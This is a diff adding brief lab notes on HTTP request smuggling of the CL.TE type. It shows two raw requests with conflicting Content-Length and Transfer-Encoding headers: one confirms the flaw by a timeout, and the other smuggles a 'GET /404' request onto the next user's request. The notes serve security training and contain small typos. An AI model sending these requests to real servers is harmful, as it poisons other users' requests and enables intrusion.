@@ -1,0 +1,33 @@
+Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
+
+CL.TE -> front-end: Content-Length: Length
+        Back-end: Transfer-Encoding: chunked
+
+Analysis:
+(1) POST / HTTP/1.1  -> supports only < 1.1 (auto update content length)
+Host: url
+Conent-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+x
+
+--------> timeout (CL.TE)
+
+
+(2) POST / HTTP/1.1  -> supports only < 1.1
+Host: url
+Conent-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: x
+-----------------
+
+\r\n -> Line new Line
+0 -> end for Transfer-Encoding
